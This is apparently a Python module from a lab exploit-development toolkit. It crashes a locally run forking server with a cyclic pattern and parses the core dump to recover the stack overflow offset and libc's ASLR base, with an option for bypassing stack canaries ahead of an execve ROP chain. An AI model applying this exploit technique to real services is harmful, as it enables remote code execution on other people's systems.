import glob
import time
from dataclasses import dataclass
from pathlib import Path

from pwn import cyclic, cyclic_find, p64, remote
from pwnlib.elf.corefile import Corefile

from .server import ForkingServer

_HEADER_MATCH_LEN = 64
_CRASH_PATTERN_LENGTH = 512
_CORE_WAIT_TIMEOUT = 5.0
_CORE_POLL_INTERVAL = 0.1


class LeakError(Exception):
    pass


@dataclass(frozen=True)
class LeakResult:
    offset: int
    libc_base: int


def probe(server: ForkingServer, libc_path: str | Path, prefix: bytes = b"") -> LeakResult:
    """Crashes one connection to `server` and recovers both the overflow
    offset and libc's real runtime base from the resulting crash dump —
    same byte-matching-a-mapped-file-header technique Phase 4 used for
    libc's base (chainer/exploit.py), generalized to also read the crash
    RIP for the offset (same technique offset/finder.py uses), all from a
    single crash against a genuinely ASLR'd target. The result is then
    reused by a *separate*, later connection to the same still-running
    server — valid because fork() never re-randomizes a child's memory
    layout, not because ASLR was disabled anywhere.

    `prefix` is sent before the cyclic pattern, unchanged — for a
    canary-protected target (Phase 6's canary/ module), passing the
    already-cracked canary bytes as `prefix` clears the canary check first,
    so the cyclic pattern reaches the return address instead of tripping
    __stack_chk_fail. `offset` is still relative to the start of the cyclic
    part (i.e. right after `prefix`), matching how build_canary_execve_chain()
    composes the final payload as `prefix + b"A" * offset + chain.payload()`.
    """
    io = remote("127.0.0.1", server.port)
    io.send(prefix + cyclic(_CRASH_PATTERN_LENGTH))
    io.recvall(timeout=2.0)
    io.close()

    core = _wait_for_crash_core(server)
    try:
        offset = cyclic_find(p64(core.rip))
        if offset == -1:
            raise LeakError(
                f"crash rip 0x{core.rip:x} not found in cyclic pattern "
                f"(pattern_length={_CRASH_PATTERN_LENGTH} may be too short)"
            )

        libc_header = Path(libc_path).read_bytes()[:_HEADER_MATCH_LEN]
        libc_base = None
        for mapping in core.mappings:
            if mapping.data[:_HEADER_MATCH_LEN] == libc_header:
                libc_base = mapping.start
                break
        if libc_base is None:
            raise LeakError(f"could not locate {libc_path}'s runtime base in the crash corefile")
    finally:
        core.file.close()

    return LeakResult(offset=offset, libc_base=libc_base)


def _wait_for_crash_core(server: ForkingServer) -> Corefile:
    # QEMU writes this file itself (independent of any pwntools process
    # tracking) whenever the emulated guest crashes — named uniquely per
    # crash (embeds the guest's own PID + timestamp), unlike the plain
    # "core" file this container's native core_pattern also produces (that
    # one is the *qemu interpreter's own* host-arch dump, irrelevant here,
    # cleaned up defensively below). Each ForkingServer has its own temp
    # cwd, so there's no risk of an unrelated run's corefile matching.
    basename = Path(server.binary_path).name
    pattern = str(server.cwd / f"qemu_{basename}_*.core")
    deadline = time.monotonic() + _CORE_WAIT_TIMEOUT
    while time.monotonic() < deadline:
        matches = sorted(glob.glob(pattern))
        if matches:
            core_path = Path(matches[-1])
            core = Corefile(str(core_path))
            core_path.unlink(missing_ok=True)
            (server.cwd / "core").unlink(missing_ok=True)
            return core
        time.sleep(_CORE_POLL_INTERVAL)
    raise LeakError(f"target crashed but no core dump appeared within {_CORE_WAIT_TIMEOUT}s")
